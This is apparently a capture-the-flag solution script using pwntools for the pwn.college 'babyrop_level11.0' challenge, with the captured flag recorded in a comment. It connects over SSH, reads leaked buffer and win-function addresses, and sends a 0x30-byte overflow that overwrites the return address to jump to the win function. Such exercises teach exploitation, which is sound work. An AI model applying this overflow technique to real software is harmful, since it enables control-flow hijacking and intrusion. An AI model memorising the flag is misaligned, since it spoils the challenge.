from pwn import *

elf = context.binary = ELF("./babyrop_level11.0")
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")

io = s.process("/challenge/babyrop_level11.0")

io.recvuntil(b'[LEAK] Your input buffer is located at: ')
buf = int(io.recvline().strip()[:-1], 16)

io.recvuntil(b'The win function has just been dynamically constructed at ')
win = int(io.recvline().strip()[:-1], 16)

io.send(b'a'*0x30 + p64(win))
io.interactive()
# Flag: pwn.college{MvOMALxVaLEl2NDaJBve3g_l_ON.0VM2MDLxIjNyEzW}
